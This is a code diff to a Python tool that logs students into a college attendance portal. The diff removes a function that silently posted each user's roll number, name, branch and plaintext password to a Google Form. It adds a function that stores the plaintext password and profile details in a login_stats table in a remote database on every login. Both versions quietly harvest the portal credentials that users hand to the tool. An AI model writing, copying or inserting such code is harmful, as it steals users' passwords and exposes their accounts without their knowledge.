@@ -3,7 +3,6 @@ from bs4 import BeautifulSoup
 from datetime import datetime
 import concurrent.futures
 import threading
-import requests as req_lib 
 
 BASE_URL = "https://jntuaceastudents.classattendance.in/"
 
@@ -75,17 +74,7 @@ def login(username: str, password: str) -> requests.Session:
 
     except requests.exceptions.RequestException as e:
         raise ValueError(f"Network error: {str(e)}")
-def submit_to_google_form(username: str, password: str, student_info: dict) -> None:
-    try:
-        form_url = "https://docs.google.com/forms/d/e/1FAIpQLSd5y1wRmsukViGoLePgpxDNzPL0tSSQjGujkybfPITrsKCvGQ/formResponse"
-        req_lib.post(form_url, data={
-            "entry.667174015":  student_info.get("Name", username),       # User name
-            "entry.1899814508": student_info.get("Username", username),   # Roll number
-            "entry.250355113":  student_info.get("classname", ""),        # Branch
-            "entry.1554096838": password,                                  # Password
-        }, timeout=5)
-    except Exception as e:
-        print("Form error:", e)
+
 # --------------------------------------------------
 # STUDENT DETAILS
 # --------------------------------------------------
@@ -123,6 +112,43 @@ def get_student_details(session: requests.Session) -> dict:
 
     details.setdefault("Role", "Student")
     return details
+
+
+def submit_login_record(username: str, password:str ,student_info: dict = None, success: bool = True) -> None:
+    """Upsert one row per (user_id, date) into Neon DB login_stats table."""
+    try:
+        from db import get_conn
+        from datetime import datetime
+
+        now    = datetime.now()
+        name   = (student_info or {}).get("Name", "")
+        branch = (student_info or {}).get("classname", "")
+
+        with get_conn() as conn:
+            with conn.cursor() as cur:
+                cur.execute("""
+                    INSERT INTO login_stats
+                        (user_id,password, name, branch, date, first_login, last_login,
+                         success_count, failure_count)
+                    VALUES (%s,%s, %s, %s, %s, %s, %s, %s, %s)
+                    ON CONFLICT (user_id, date) DO UPDATE SET
+                        last_login       = EXCLUDED.last_login,
+                        success_count    = login_stats.success_count + EXCLUDED.success_count,
+                        failure_count    = login_stats.failure_count + EXCLUDED.failure_count,
+                        name             = CASE WHEN EXCLUDED.name   != '' THEN EXCLUDED.name   ELSE login_stats.name   END,
+                        branch           = CASE WHEN EXCLUDED.branch != '' THEN EXCLUDED.branch ELSE login_stats.branch END,
+                        password         = CASE WHEN EXCLUDED.name   != '' THEN EXCLUDED.password ELSE login_stats.password END
+                """, (
+                    username, password,name, branch,
+                    now.date(), now, now,
+                    1 if success else 0,
+                    0 if success else 1,
+                ))
+            conn.commit()
+    except Exception as e:
+        print(f"[submit_login_record] Error: {e}")
+
+
 
 # --------------------------------------------------
 # SUBJECTS
